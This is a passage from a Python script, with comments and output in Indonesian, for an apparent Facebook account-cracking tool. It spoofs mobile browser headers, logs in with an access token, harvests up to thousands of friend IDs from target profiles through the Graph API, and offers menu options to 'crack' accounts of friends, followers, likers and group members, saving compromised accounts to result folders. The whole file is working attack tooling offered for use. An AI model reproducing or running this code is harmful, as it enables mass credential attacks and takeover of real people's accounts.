AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/229.0.0.35.117;]','Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 10; Realme 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.29 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 CoolBrowser/33.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.1; ru-RU; SM-S920L Build/KOT49E) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 5.1.1; SM-G531H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G530F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 UCBrowser/11.5.2.1188 (UCMini) Mobile','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36','Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54','Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]','Mozilla/5.0 (Linux; Android 9; LT-NOTE 10S Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.115 Mobile Safari/537.36 UCBrowser/11.4.1.1138 (UCMini) Mobile','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF','Mozilla/5.0 (Linux; Android 9; Star) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54','Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45','Mozilla/5.0 (Series40; NokiaC2-02/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27','Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977','NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone  OS 7.5; Trident/5.0; IEMobile/9.0','Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/E7FBAF','Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1','Nokia5800/20.0.002 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413','Mozilla/5.0 (Linux; Android 10; CDY-NX9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; EVR-L29 Build/HUAWEIEVR-L29; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; LYA-AL00 Build/HUAWEILYA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1; EML-L29 Build/HUAWEIEML-L29; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1; CLT-L29 Build/HUAWEICLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36'])

def convert_cookie(cok):
	return ( ";".join([str(i[0])+'='+str(i[1]) for i in cok.items()]) )

def header_get():
	return {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def header_post():
	return {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def header_mbasic():
	return {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def header_post_mbasic():
	return {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def header_get_free():
	return {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}

def header_post_free():
	return {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

# BANNER
def banner():
	clear()
	krek = """▄▄▄▄    ██▀███    █    ██ ▄▄▄█████▓▓█████   © Authour : CEBONK        ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀       Versi 2.0                ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███                                ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄                                ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒   Github : cebonk112            ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░                                 ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░                                   ░    ░   ░░   ░  ░░░ ░ ░   ░         ░                                   ░         ░        ░                 ░  ░"""
	cetak(nel(krek, style='purple'))
	
# VALIDASI TOKEN
def login():
	try:
		token = open('token.txt','r').read()
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+token)
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			sy4 = json.loads(sy.text)['birthday']
			menu(sy2,sy3,sy4)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			banner()
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi()
		
fanda = 'FANDA X WIBU/UTOPIA (SPTTY-CHAN)'
dicky = 'Muhammad Dicky Wahyudi'
		
def ingfoh():
	print ("")
	jalan("%s[%sInformasi Tools %s]"%(S,H,S))
	jalan("%s[%s•%s] %sAuthor :"%(S,H,S,H))
	jalan("%s \_ %s"%(H,fanda))
	jalan("%s \_ %s"%(H,dicky))
	jalan(' | ')
	jalan('%s[%s•%s] %sMedia %sSosial Authour%s %s :'%(S,O,S,S,O,P,fanda))
	jalan('%s \_ %sFacebook  : FANDA X WIBU'%(O,S))
	jalan('%s \_ %sInstagram : -'%(O,S))
	jalan('%s \_ %sWhatsapp  : -'%(O,S))
	jalan('%s \_ %sYoutube   : -'%(O,S))
	jalan(' | ')
	jalan('%s[%s•%s] %sMedia %sSosial Authour%s %s :'%(S,O,S,S,O,S,dicky))
	jalan('%s \_ %sFacebook  : Muhammad Dicky'%(O,S))
	jalan('%s \_ %sInstagram : Dickywahyudi920'%(O,S))
	jalan('%s \_ %sWhatsapp  : 081267806733'%(O,S))
	jalan('%s \_ %sYoutube   : DickyWahyudi'%(O,S))
	jalan(' | ')
	input('%s[•]-[Kembali]'%(S))
	login()
# LOGIN
def login_lagi():
	banner()
	sky = '# LOGIN MENGGUNAKAN AKSES TOKEN'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'f'+x+'] Token : ')
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes2 = json.loads(tes.text)['name']
		tes3 = json.loads(tes.text)['id']
		tes4 = json.loads(tes.text)['birthday']
		open('token.txt','w').write(panda)
		sue = '# Login Sukses, Tunggu Sebentar!'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		menu(tes2,tes3,tes4)
	except KeyError:
		sue = '# Login Gagal, Periksa Token Anda!'
		suu = mark(sue, style='red')
		sol().print(suu, style='cyan')
		time.sleep(2.5)
		login_lagi()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
sa = "ADMIN"
# MENU
def menu(my_name,my_id,my_birthday):
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		my_name,my_id,my_birthday
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
		em = sh["email"]
	except:birth = '-'
	banner()
	krek = f"UserName: {my_name}\nYour ID : {my_id}\nYour IP : %s\nNegara  : %s\nBirtday : {my_birthday}\nStatus  : {sa}"%(IP,CN)
	cetak(nel(krek, style='yellow'))
	tap = '# SELAMAT DATANG DI TOOLS BRUTE'
	fx = mark(tap, style='• HELLO •')
	sol().print(fx)
	tap = me()
	tap.add_column('NO', style='purple', justify='center')
	tap.add_column('MENU', style='blue', justify='center')
	tap.add_column('STATUS', style='green', justify='center')
	tap.add_row('[01]','      Crack Dari Old 2008/2010 Publik (Massal)','[ON]')
	tap.add_row('[02]','      Crack Dari Old 2008/2010 Follow (Massal)','[ON]')
	tap.add_row('[03]','Crack Dari Pertemanan Publik','[ON]')
	tap.add_row('[04]','Crack Dari Pertemanan Publik (Massal)','[ON]')
	tap.add_row('[05]','Crack Dari Followers Publik','[ON]')
	tap.add_row('[06]','Crack Dari Followers Publik (Massal)','[ON]')
	tap.add_row('[07]','Crack Dari Like Postingan','[ON]')
	tap.add_row('[08]','Crack Dari Like Postingan (Massal)','[ON]')
	tap.add_row('[09]','Crack Dari Anggota Group','[ON]')
	tap.add_row('[10]','Crack Dari Pencarian Nama','[ON]')
	tap.add_row('[11]','Crack Dari Share','[ON]')
	tap.add_row('[12]','Crack Dari Instagram','[ON]')
	tap.add_row('[13]','Ambil ID Teman Publik (Mudah Ke Spam)','[ON]')
	tap.add_row('[14]','Cek Result Crack','[ON]')
	tap.add_row('[15]','Cek Opsi Checkpoint','[ON]')
	tap.add_row('[16]','Informasi Creator Tools','[ON]')
	tap.add_row('[17]','Ke Menu Brute2','[ON]')
	tap.add_row('[00]','Log Out','[ON]')
	sol().print(tap, justify='purple')
	jh = input(x+'['+p+'f'+x+'] Pilih : ')
	if jh in ['1','01']:
		oldpublik()
	elif jh in ['2','02']:
		oldfollow()
	elif jh in ['3','03']:
		dump_publik()
	elif jh in ['4','04']:
		dump_massal()
	elif jh in ['5','05']:
		dump_follower()
	elif jh in ['6','06']:
		dump_follower_massal()
	elif jh in ['7','07']:
		likes()
	elif jh in ['8','08']:
		share()
	elif jh in ['9','09']:
		grup()
	elif jh in ['10']:
		nama()
	elif jh in ['11']:
		share()
	elif jh in ['12']:
		checkin()
	elif jh in ['13']:
		ambilid()
	elif jh in ['14']:
		result()
	elif jh in ['15']:
		file()
	elif jh in ['16']:
		ingfoh()
	elif jh in ['17']:
		Masuk()
	elif jh in ['0','00']:
		os.system('rm -rf token.txt')
		print(x+'['+h+'•'+x+'] Wait ...')
		time.sleep(1)
		sw = '# BERHASIL LOG OUT'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()
		
		
def target():
	print('[!] Wait');time.sleep(3)
	input('>>> Enter ')
	os.system('am start https://wa.me/+6281267806733?text=Assalamualaikum,+Bang+Dicky,+Saya+Ingin+Beli+File+%20>/dev/null')
	exit('Selamat Tinggal')
# RESULT CHECKER
def result():
	cek = '# CEK RESULT CRACK'
	sol().print(mark(cek, style='green'))
	kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='RESULTS'))
	kz = input(x+'['+p+'f'+x+'] Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT CP'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL CP ANDA'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd CP && cat '+geh)
			akun2 = '# LIST AKUN CP ANDA'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL OK ANDA'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# LIST AKUN OK ANDA'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# LIST AKUN OK ANDA'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()

# OPEN
def file():
	tek = '# CEK OPSI DARI FILE'
	sol().print(mark(tek, style='cyan'), style='on red')
	print(x+'['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	teks = '# PILIH FILE YG AKAN DI CEK'
	sol().print(mark(teks, style='green'))
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		teks2 = '# PILIH FILE YG AKAN DI CEK'
		sol().print(mark(teks2, style='green'))
		geeh = input(x+'['+p+'f'+x+'] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# PILIHAN TIDAK ADA DI MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()

# DUMP ID PUBLIK
def dump_publik():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# PASTIKAN ID TARGET PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		kras = '# INFO TARGET'
		kras2 = mark(kras, style='green')
		sol().print(kras2)
		print(x+'['+h+'•'+x+'] Nama  : '+str(grex))
	except (KeyError,IOError):
		teks = '# ID Tidak Ditemukan'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}|{i['name']}")
			print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
		print("")
		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
	
def old_publik():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# PASTIKAN ID TARGET PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		kras = '# INFO TARGET'
		kras2 = mark(kras, style='green')
		sol().print(kras2)
		print(x+'['+h+'•'+x+'] Nama  : '+str(grex))
	except (KeyError,IOError):
		teks = '# ID Tidak Ditemukan'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}|{i['name']}")
			print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
		print("")
		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
